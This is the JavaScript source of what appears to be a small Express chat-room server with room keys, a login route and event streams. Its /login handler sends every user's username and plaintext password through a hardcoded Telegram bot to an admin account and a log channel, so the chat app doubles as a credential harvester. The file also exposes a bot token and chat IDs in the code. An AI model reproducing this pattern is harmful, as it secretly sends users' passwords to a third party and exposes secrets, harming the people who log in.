const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8157449994:AAENXtv_w_gfBz36ZVD_DKLETHzYzpEvAAM';
const LOG_CHANNEL_ID = '-1002846991732';
const ADMIN_USER_ID = '7307633923';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(express.json());
app.use(express.static(__dirname));

const rooms = {};

// NEW: Global set to track currently active usernames (across all rooms)
const activeUsernames = new Set();

function cleanExpiredRooms() {
  const now = Date.now();
  for (const key in rooms) {
    const room = rooms[key];
    if (room.expiresAt < now) {
      room.clients.forEach(c => c.res.end());
      delete rooms[key];
    } else {
      room.messages = room.messages.filter(m => now - m.timestamp < 24 * 3600 * 1000);
    }
  }
}
setInterval(cleanExpiredRooms, 60000);

app.get('/generate-key', (req, res) => {
  const key = uuidv4().split('-')[0];
  const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
  rooms[key] = { messages: [], clients: [], expiresAt };
  res.json({ key });
});

app.get('/join-room/:key', (req, res) => {
  const room = rooms[req.params.key];
  if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
  res.json({ success: true });
});

app.post('/login', async (req, res) => {
  const { key, username, password } = req.body;
  const room = rooms[key];
  if (!room || room.expiresAt < Date.now()) return res.json({ success: false });

  // Check if username is already active anywhere
  if (activeUsernames.has(username)) {
    return res.json({ success: false, message: 'Username is currently in use by another user' });
  }

  const loginText = `🔐 New Login\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;

  try {
    // Check permanent username block via Telegram logs
    const updates = await axios.get(`${TELEGRAM_API}/getUpdates`);
    const used = updates.data.result.some(u => {
      const text = u.message?.text || '';
      return text.includes(`Username: ${username}`);
    });

    if (used) {
      return res.json({ success: false, message: 'Username is permanently taken' });
    }

    // Send login info to admin and log channel
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: ADMIN_USER_ID,
      text: loginText
    });
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: LOG_CHANNEL_ID,
      text: loginText
    });

    // Mark username as active now
    activeUsernames.add(username);

    res.json({
      success: true,
      expiresAt: new Date(room.expiresAt).toISOString(),
      history: room.messages.map(m => `${m.user}: ${m.message}`)
    });

  } catch (err) {
    console.error('Telegram error:', err.message);
    res.json({ success: false });
  }
});

app.post('/send-message', (req, res) => {
  const { key, user, message } = req.body;
  const room = rooms[key];
  if (!room) return res.status(404).end();

  const entry = { user, message, timestamp: Date.now() };
  room.messages.push(entry);
  const formatted = `${user}: ${message}`;
  room.clients.forEach(c => c.res.write(`data: ${formatted}\n\n`));
  res.end();
});

app.get('/stream/:key', (req, res) => {
  const key = req.params.key;
  const username = req.query.username;
  const room = rooms[key];
  if (!room || !username) return res.status(400).end();

  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });
  res.write('\n');

  const client = { res, username };
  room.clients.push(client);

  // When client disconnects, remove from clients list AND free username
  req.on('close', () => {
    room.clients = room.clients.filter(c => c !== client);
    // Remove username from active set (allow reuse)
    activeUsernames.delete(username);
  });
});

app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
